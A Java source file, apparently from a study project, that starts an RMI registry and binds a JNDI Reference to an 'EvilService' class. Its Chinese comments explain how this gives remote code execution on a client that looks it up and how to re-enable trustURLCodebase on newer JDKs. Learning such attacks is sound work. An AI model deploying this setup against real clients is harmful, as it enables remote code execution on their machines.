package test_project.basic.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class Test_registryService {
	
	public static void main(String[] args) {
		Test_registryService testService = new Test_registryService();
		testService.testServerRegistryService();
	}
	
	/**
	 * 注册本地对象到RMI服务
	 */
	public void testLocalRegistryService() {
		try {
			//本地主机上的远程对象注册表Registry的实例,默认端口1099
			Registry registry = LocateRegistry.createRegistry(1099);
			//创建一个远程对象
			EvilRemoteService evilRemoteService = new EvilRemoteServiceImpl();
			//把远程对象注册到RMI注册服务器上，并命名为EvilRemoteService
			registry.bind("EvilRemoteService", evilRemoteService);
			//registry.rebind("EvilRemoteService", evilRemoteService);
			System.out.println("启动RMI服务成功~~~");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	/**
	 * 注册远程服务器对象到RMI服务
	 * 参考：https://paper.seebug.org/1207/
	 */
	public void testServerRegistryService() {
		try {
			//本地主机上的远程对象注册表Registry的实例,默认端口1099
			Registry registry = LocateRegistry.createRegistry(1099);
			
			/**
			 * 简单解释下Reference类的作用就是记录一个远程对象的位置，
			 * 然后服务端将实例化好的Reference类通过bind方法注册到rmiregistry上，
			 * 然后客户端通过rmi registry返回的Stub信息找到服务端并调用该Reference对象，
			 * Reference对象通过URLClassloader将记录在Reference对象中的Class从远程地址上加载到本地，
			 * 从而触发恶意类中的静态代码块，导致RCE
			 */
	        // 创建 JNDI 的引用
	        // className 远程对象的类名称，不能为null
	        // factory 加载类成功后要实例化的类名称
	        // factoryLocation 提供类文件的地址，为null时从本地加载
			Reference reference = new Reference("test_project.basic.rmi.EvilService", "test_project.basic.rmi.EvilService", null);
			/**
			 * com.sun.jndi.rmi.registry.ReferenceWrapper;
			 * jdk11已经无法引入该对象
			 * jdk8u121、7u131、6u141版本开始默认com.sun.jndi.rmi.object.trustURLCodebase设置为false，rmi加载远程的字节码不会执行成功。
			 * 如果需要在高版本的JDK里执行，需要设置com.sun.jndi.rmi.object.trustURLCodebase=true 。
			 * 例如：IDEA: Run -> edit configurations -> VM options 中添加-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
			 */
			//将 JNDI引用 包装为 RMI 可注册的类，即继承UnicastRemoteObject类，实现Remote接口，抛出RemoteException异常
			ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
			
			//尝试实现自定义ReferenceWrapper
			//CustomReferenceWrapper referenceWrapper = new CustomReferenceWrapper(reference);
			
			//把远程对象注册到RMI注册服务器上，并命名为EvilRemoteService
			registry.bind("EvilService", referenceWrapper);
			//registry.rebind("EvilRemoteService", evilRemoteService);
			System.out.println("启动RMI服务成功~~~");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
}
